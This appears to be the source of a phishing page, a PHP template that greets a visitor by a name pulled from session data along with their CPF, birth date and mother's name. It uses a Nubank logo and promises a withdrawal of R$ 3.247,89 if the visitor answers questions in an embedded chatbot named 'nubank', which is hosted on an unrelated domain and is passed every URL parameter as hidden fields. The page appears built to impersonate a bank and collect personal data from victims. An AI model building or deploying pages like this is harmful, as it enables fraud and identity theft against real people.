<?php
session_start();

$nome = $_SESSION['nome'] ?? '';
$cpf = $_SESSION['cpf'] ?? '';
$nascimento = $_SESSION['nascimento'] ?? '';
$mae = $_SESSION['mae'] ?? 'Não informado';
?>


<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" crossorigin="" type="font/woff2">
  <link rel="stylesheet" href="css/4c531af09e53964b.css" data-precedence="next">
  <link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-16e1aae0254933fa.js">
  <script src="js/4bd1b696-dd67615fb2881107.js" async=""></script>
  <script src="js/684-7ad13f0f08a97e29.js" async=""></script>
  <script src="js/main-app-770f509432689459.js" async=""></script>
  <script src="js/635-1aa044f5e9636678.js" async=""></script>
  <script src="js/604-fd8116797c061241.js" async=""></script>
  <script src="js/layout-57d92b1f1f9773b4.js" async=""></script>
  <script src="js/page-8ee94bbef28d4a7d.js" async=""></script>
  <link rel="preload" href="https://cdn.utmify.com.br/scripts/utms/latest.js" as="script">
  <meta name="next-size-adjust" content="">
  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="16x16">
  <script src="js/polyfills-42372ed130431b0a.js" nomodule=""></script>
</head>

<body class="__className_d65c78 flex flex-col min-h-screen bg-slate-50 vsc-initialized" cz-shortcut-listen="true">
  <header class="bg-white p-2 shadow-sm">
    <div class="container mx-auto"><img alt="Logo placeholder" loading="lazy" width="900" height="900" decoding="async"
        data-nimg="1" class="h-10 w-auto" style="color:transparent" src="images/logo.webp"></div>
  </header>
  <nav class="w-full">
    <div class="w-full grid grid-cols-3 h-12 bg-white rounded-none border-b">
      <div class="flex items-center justify-center text-xs h-full text-gray-500 transition-colors cursor-default select-none">Verificar</div>
      <div class="flex items-center justify-center text-xs h-full text-gray-500 transition-colors cursor-default select-none">Constultando</div>
      <div class="flex items-center justify-center text-xs h-full text-[#041F55] border-b-2 border-blue-900 bg-[#E6E6E6] transition-colors cursor-default select-none">Saque</div>
    </div>
  </nav>
  <main class="flex-grow">
    <div class="p-4">
      <div data-slot="card"
        class="bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 border-none shadow-lg pt-0 relative overflow-hidden min-h-[60vh]">
        <div class="absolute left-0 top-0 bottom-0 w-1.5 bg-[#041F55]"></div>
        <div class="px-4 pt-6 pb-0 text-center max-w-md mx-auto text-[#041F55]">
          <p class="text-base"><span class="font-bold">Olá, </span><span class="text-black font-bold"><?= $nome ?>!</span></p>
          <p class="font-bold mt-1 text-sm">Responda as perguntas abaixo para realizar<br>seu saque de <span
              class="text-[#041F55]">R$&nbsp;3.247,89</span></p>
        </div>
        <div data-slot="card-content" class="px-4 py-2">
          <div class="w-full" style="min-height: 70vh;"><typebot-standard style="height: 70vh;"></typebot-standard>
          </div>
        </div>
      </div>
    </div>
  </main>
  <footer class="mt-auto bg-[#041F55] text-white p-4 pt-1">
    <div class="mx-auto space-y-2">
      <div class="flex justify-center items-center"><img alt="Footer logo placeholder" loading="lazy" width="200"
          height="50" decoding="async" data-nimg="1" class="h-20 w-auto" style="color:transparent"
          src="images/logo-branca.webp"><img alt="Footer logo placeholder" loading="lazy" width="200" height="50"
          decoding="async" data-nimg="1" class="h-9 w-auto" style="color:transparent" src="images/nubank-logo.webp">
      </div>
      <div data-orientation="horizontal" role="none" data-slot="separator-root"
        class="bg-border shrink-0 data-[orientation=horizontal]:h-px data-[orientation=horizontal]:w-full data-[orientation=vertical]:h-full data-[orientation=vertical]:w-px text-white">
      </div>
      <div class="text-center text-xs">Política de privacidade e Termos de Uso</div>
    </div>
  </footer>

  <script type="module">
  import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.59/dist/web.js';

  const params = Object.fromEntries(new URLSearchParams(window.location.search));

  Typebot.initStandard({
    typebot: "nubank",
    apiHost: "https://chat.wipik.site",
    hiddenFields: params
  });
</script>

</body>

</html>